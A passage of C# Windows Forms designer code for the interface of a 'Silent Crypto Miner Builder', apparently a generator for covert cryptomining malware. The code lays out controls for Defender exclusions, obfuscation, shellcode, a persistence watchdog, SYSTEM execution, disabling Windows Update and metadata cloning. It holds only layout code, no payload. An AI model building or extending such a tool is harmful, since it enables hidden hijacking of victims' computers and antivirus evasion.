            this.labelHackforums.AutoSize = true;
            this.labelHackforums.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelHackforums.Location = new System.Drawing.Point(57, 167);
            this.labelHackforums.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelHackforums.Name = "labelHackforums";
            this.labelHackforums.Size = new System.Drawing.Size(77, 17);
            this.labelHackforums.TabIndex = 22;
            this.labelHackforums.TabStop = true;
            this.labelHackforums.Text = "Hackforums";
            this.labelHackforums.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelHackforums_LinkClicked);
            // 
            // labelGitHub
            // 
            this.labelGitHub.AutoSize = true;
            this.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelGitHub.Location = new System.Drawing.Point(8, 167);
            this.labelGitHub.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelGitHub.Name = "labelGitHub";
            this.labelGitHub.Size = new System.Drawing.Size(48, 17);
            this.labelGitHub.TabIndex = 21;
            this.labelGitHub.TabStop = true;
            this.labelGitHub.Text = "GitHub";
            this.labelGitHub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelGitHub_LinkClicked);
            // 
            // txtLog
            // 
            this.txtLog.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtLog.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtLog.ForeColor = System.Drawing.Color.Silver;
            this.txtLog.Location = new System.Drawing.Point(10, 41);
            this.txtLog.Margin = new System.Windows.Forms.Padding(2);
            this.txtLog.MaxLength = 32767;
            this.txtLog.MultiLine = true;
            this.txtLog.Name = "txtLog";
            this.txtLog.Size = new System.Drawing.Size(399, 119);
            this.txtLog.TabIndex = 18;
            this.txtLog.Text = "Output...";
            this.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtLog.UseSystemPasswordChar = false;
            this.txtLog.WordWrap = false;
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBuild.Location = new System.Drawing.Point(309, 9);
            this.btnBuild.Margin = new System.Windows.Forms.Padding(2);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(99, 25);
            this.btnBuild.TabIndex = 17;
            this.btnBuild.Text = "Build";
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // Builder
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formBuilder);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "Builder";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formBuilder.ResumeLayout(false);
            this.tabcontrolBuilder.ResumeLayout(false);
            this.tabMain.ResumeLayout(false);
            this.tabMain.PerformLayout();
            this.tabStartup.ResumeLayout(false);
            this.tabStartup.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.tabAssembly.ResumeLayout(false);
            this.tabAssembly.PerformLayout();
            this.tabIcon.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
            this.tabOptions.ResumeLayout(false);
            this.tabOptions.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picAdmin1)).EndInit();
            this.tabBuild.ResumeLayout(false);
            this.tabBuild.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formBuilder;
        internal System.ComponentModel.BackgroundWorker workerBuild;
        internal MephButton btnAssemblyRandom;
        internal MephButton btnAssemblyClone;
        internal MephTextBox txtAssemblyVersion4;
        internal MephTextBox txtAssemblyVersion3;
        internal MephTextBox txtAssemblyVersion2;
        internal MephTextBox txtAssemblyVersion1;
        internal MephTextBox txtAssemblyTrademark;
        internal MephTextBox txtAssemblyCompany;
        internal MephTextBox txtAssemblyCopyright;
        internal MephTextBox txtAssemblyDescription;
        internal MephTextBox txtAssemblyProduct;
        internal MephTextBox txtAssemblyTitle;
        internal MephTextBox txtIconPath;
        internal MephButton btnBrowseIcon;
        internal MephTextBox txtInstallEntryName;
        internal Label labelStartupEntryName;
        internal PictureBox picIcon;
        internal Label labelStartupSavePath;
        internal MephComboBox txtInstallPath;
        internal MephCheckBox chkAssembly;
        internal MephCheckBox chkIcon;
        internal MephCheckBox chkInstall;
        internal MephTabcontrol tabcontrolBuilder;
        internal TabPage tabMain;
        internal TabPage tabStartup;
        internal TabPage tabAssembly;
        internal TabPage tabIcon;
        internal TabPage tabBuild;
        internal MephTextBox txtLog;
        internal MephButton btnBuild;
        internal Label labelAssemblyVersion;
        internal LinkLabel labelHackforums;
        internal LinkLabel labelGitHub;
        internal Label labelSeconds;
        internal Label labelStartDelay;
        internal MephTextBox txtStartDelay;
        internal Label labelStartupWatchdog;
        internal MephToggleSwitch toggleWatchdog;
        internal Label labelHelp;
        internal LinkLabel labelWiki;
        internal MephButton btnMinerRemove;
        internal MephButton btnMinerEdit;
        internal MephButton btnMinerAdd;
        internal Label labelMiners;
        internal TabPage tabOptions;
        internal Label labelOptionAdministrator;
        internal MephToggleSwitch toggleAdministrator;
        internal PictureBox picAdmin1;
        internal Label labelOptionObfuscation;
        internal MephToggleSwitch toggleObfuscation;
        internal Label labelOptionWD;
        internal MephToggleSwitch toggleWDExclusions;
        internal MephListBox listMiners;
        internal Label labelOptionShellcode;
        internal MephToggleSwitch toggleShellcode;
        internal MephButton btnLoadState;
        internal MephButton btnSaveState;
        internal Label labelLang;
        internal MephComboBox comboLanguage;
        internal Label label1;
        internal MephToggleSwitch toggleDisableSleep;
        internal MephCheckBox chkBlockWebsites;
        internal MephTextBox txtBlockWebsites;
        internal Label labelStartupAutoDelete;
        internal MephToggleSwitch toggleAutoDelete;
        internal PictureBox pictureBox1;
        internal MephTextBox txtInstallFileName;
        internal Label labelStartupFileName;
        internal PictureBox pictureBox2;
        internal Label labelStartupRunSystem;
        internal MephToggleSwitch toggleRunSystem;
        internal PictureBox pictureBox3;
        internal Label labelOptionWindowsUpdate;
        internal MephToggleSwitch toggleWindowsUpdate;
        internal MephButton btnAdvancedOptions;
        internal MephListBox cFormAO;
        internal Label label2;
        internal Label label3;
        internal MephTextBox txtExeSize;
    }
}